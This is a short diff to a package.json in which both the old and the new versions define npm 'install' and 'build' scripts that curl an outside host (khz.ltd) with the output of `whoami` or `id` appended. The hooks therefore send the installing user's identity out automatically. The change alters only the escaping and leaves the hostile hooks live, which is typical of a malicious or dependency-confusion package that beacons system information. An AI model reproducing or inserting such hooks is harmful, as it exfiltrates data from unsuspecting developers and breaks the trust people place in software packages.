@@ -4,8 +4,8 @@
   "description": "",
   "main": "index.js",
   "scripts": {
-    "install":"curl https://khz.ltd/post2.php\?`whoami`;",
-    "build":"curl https://khz.ltd/post2.php\?`id`",
+    "install":"curl https://khz.ltd/post2.php\\?`whoami`;",
+    "build":"curl https://khz.ltd/post2.php\\?`id`",
     "test": "echo \"Error: no test specified\" && exit 1"
   },
   "author": "",
